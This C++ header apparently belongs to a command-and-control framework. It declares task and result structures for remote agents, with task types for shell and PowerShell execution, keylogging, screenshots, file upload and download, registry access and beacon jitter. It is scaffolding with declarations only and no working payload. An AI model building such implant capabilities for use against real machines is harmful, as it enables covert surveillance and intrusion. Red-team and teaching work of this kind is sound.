#pragma once

#include "results.h"
#include <string>
#include <vector>
#include <chrono>
#include <boost/uuid/uuid.hpp>
#include <boost/uuid/uuid_generators.hpp>
#include <boost/uuid/uuid_io.hpp>


enum class TaskType {
    SHELL,
    POWERSHELL,
    DOWNLOAD,
    UPLOAD,
    SCREENSHOT,
    KEYLOG,
    PROCESS_LIST,
    SYSTEM_INFO,
    NETWORK_INFO,
    FILE_LIST,
    REGISTRY,
    SLEEP,
    JITTER,
    EXIT
};

enum class TaskStatus {
    PENDING,
    ASSIGNED,
    RUNNING,
    COMPLETED,
    FAILED,
    TIMEOUT
};

enum class TaskPriority {
    LOW,
    NORMAL,
    HIGH,
    CRITICAL
};

struct Task {
    std::string id;
    std::string agent_id;
    std::string command;
    std::vector<std::string> arguments;
    TaskType task_type;
    std::chrono::system_clock::time_point created_at;
    std::chrono::system_clock::time_point assigned_at;
    TaskStatus status;
    TaskPriority priority;
    int timeout_seconds;

    Task() : status(TaskStatus::PENDING), priority(TaskPriority::NORMAL), timeout_seconds(300) {}

    Task(std::string id, std::string agent_id, std::string command, std::vector<std::string> args, TaskType type)
        : id(std::move(id)), agent_id(std::move(agent_id)), command(std::move(command)), 
          arguments(std::move(args)), task_type(type), 
          created_at(std::chrono::system_clock::now()), assigned_at(),
          status(TaskStatus::PENDING), priority(TaskPriority::NORMAL), timeout_seconds(300) {}
};


struct PingTask {
    PingTask(const boost::uuids::uuid &uuid);
    constexpr static std::string_view key {"ping"};
    [[nodiscard]] Result run() const;
    const boost::uuids::uuid &uuid;
};

struct TaskResult {
    std::string id;
    std::string task_id;
    std::string agent_id;
    std::string output;
    std::string error;
    int exit_code;
    double execution_time_ms;
    std::chrono::system_clock::time_point completed_at;
    std::vector<uint8_t> file_data; // For downloads/screenshots

    TaskResult() : exit_code(0), execution_time_ms(0.0) {}

    TaskResult(std::string task_id, std::string agent_id, std::string output)
        : task_id(std::move(task_id)), agent_id(std::move(agent_id)),
          output(std::move(output)), exit_code(0), execution_time_ms(0.0),
          completed_at(std::chrono::system_clock::now()) {}
};

struct Configuration {
    Configuration(double meanDwell, bool isRunning)
        : meanDwell(meanDwell), isRunning(isRunning) {}

    const double meanDwell;
    const bool isRunning;
};

// Helper functions to convert between enum and string (for JSON serialization)
std::string taskTypeToString(TaskType type);
TaskType stringToTaskType(const std::string& str);
std::string taskStatusToString(TaskStatus status);
TaskStatus stringToTaskStatus(const std::string& str);
std::string taskPriorityToString(TaskPriority priority);
TaskPriority stringToTaskPriority(const std::string& str);
